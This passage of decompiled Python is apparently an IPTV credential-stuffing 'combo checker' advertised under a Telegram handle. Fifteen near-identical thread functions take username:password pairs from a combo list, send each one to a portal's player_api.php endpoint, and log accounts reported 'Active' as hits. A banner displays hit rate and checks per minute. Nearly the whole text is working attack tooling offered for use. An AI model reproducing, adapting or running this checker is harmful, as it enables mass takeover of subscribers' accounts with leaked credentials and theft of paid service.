    echo = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\x1b[1;91m            𓆩 ❦𓆪 ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴             \x1b[0;91m \x1b[0m\n\n  ╭─➤  \x1b[1;91mTelegram➢https://t.me/@A_pxl   \x1b[0;91m \x1b[0m\n  │\n  ╰─➤  \x1b[91m𝐏𝐫𝐞𝐦𝐢𝐮𝐦➢𝐯𝐞𝐫𝐢𝐳𝐨𝐧 𝟫.𝟣   \x1b[0;91m \x1b[0m\n    ╰──➤ \x1b[91m FREE Palestine 🇰🇼  \x1b[0m\n\t\n\x1b[1;91m\x1b[1;91mPortal ➤  \x1b[0m\x1b[1;107;91m [ " + portal + " ] \x1b[0m     \n\x1b[1;91mState law  ➤ \x1b[0m [ " + hellstatus + " ]\n\x1b[0m\x1b[1;91mUser | Pass ➤ \x1b[0m[" + user + ":" + pas + "]\n\x1b[1;91mHit ➤ " + str(hit) + " \x1b[91m \x1b[0m \x1b[1;31m% [ " + str(oran) + " ]   \x1b[1;91m CPM ➤ [ " + str(cpm) + " ]  \x1b[0m\n\x1b[1;91mBot [ " + str(bot) + " ] \x1b[1;91m  Total ➤ [ " + str(fyz) + " ] \x1b[0m\n\x1b[1;91mData | hour  ➤ \x1b[0m\x1b[1;97" + str(time.strftime("%d %B %Y • Hora: %H:%M:%S")) + "\x1b[0m \n\x1b[1;91mCombo : \x1b[0m\x1b[1;91m" + lista + "\x1b[0m \n\x1b[1;91mQuantidade de U&P: \x1b[0m\x1b[1;91m" + str(quantidade_linhas) + "\x1b[0m \n\n    \x1b[1;4;91mScript execution time : \x1b[0m\x1b[1;4;92m" + str(cronometrar_tempo()) + "\x1b[0m \n\n\x1b[1;3;91mApproximate time to verify the complete combo.\x1b[0m\n╰┈➤ \x1b[1;97m " + layout_tempo + "\x1b[0m \n \x1b[91m\n  ╔═════════「 🇮🇶 𝐁𝐲 𝐶𝑜𝑛𝑓𝑖𝑔 IQ ════════╗\n  ║    _   _    _   _  _         _     ║\n  ║   /_\\ | |  (_) | || |__ _ __| |__  ║\n  ║  / _ \\| |__| | | __ / _` / _| / /  ║\n  ║ /_/ \\_\\____|_| |_||_\\__,_\\__|_\\_\\  ║\n  ║                                    ║\n  ╚══════════════════════════════╝                                  \n \x1b⠀\x1b[0m\n\n\n\n\n\n"
    print_without_flickering(echo)
    cpm = time.time()


hit = 0

def d1():
    global hit
    say = 0
    for fyz in range(1, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_01"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos    ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d2():
    global hit
    say = 0
    for fyz in range(2, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_02"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos    ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d3():
    global hit
    say = 0
    for fyz in range(3, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_03"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos      ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d4():
    global hit
    say = 0
    for fyz in range(4, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_04"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d5():
    global hit
    say = 0
    for fyz in range(5, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_05"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d6():
    global hit
    say = 0
    for fyz in range(6, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_06"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d7():
    global hit
    say = 0
    for fyz in range(7, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_07"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d8():
    global hit
    say = 0
    for fyz in range(8, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_08"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d9():
    global hit
    say = 0
    for fyz in range(9, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_09"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d10():
    global hit
    say = 0
    for fyz in range(10, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_10"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d11():
    global hit
    say = 0
    for fyz in range(11, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_11"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d12():
    global hit
    say = 0
    for fyz in range(12, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_12"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d13():
    global hit
    say = 0
    for fyz in range(13, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_13"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d14():
    global hit
    say = 0
    for fyz in range(14, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_14"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


def d15():
    global hit
    say = 0
    for fyz in range(15, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = "art_ansi"

            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace("\n", ""))
            except:
                pas = "art_ansi"

            say = int(say) + 1
            bot = "Bot_15"
            oran = ""
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + ""
            bag1 = 0
            veri = ""
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if "username" in veri:
                status = veri.split('status":')[1]
                status = status.split(",")[0]
                status = status.replace('"', "")
                if status == "Active":
                    print("     # Hit_Para_Todos                 ")
                    hit = hit + 1
                    onay(veri, user, pas)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t1.start()
if botsay == 2 or botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t2.start()
if botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t3.start()
if botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t4.start()
if botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t5.start()
if botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t6.start()
if botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t7.start()
if botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t8.start()
if botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t9.start()
if botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t10.start()
if botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t11.start()
if botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15:
    t12.start()
if botsay == 13 or botsay == 14 or botsay == 15:
    t13.start()
if botsay == 14 or botsay == 15:
    t14.start()
if botsay == 15:
    t15.start()

# okay decompiling Ali_Premium_decoded.pyc
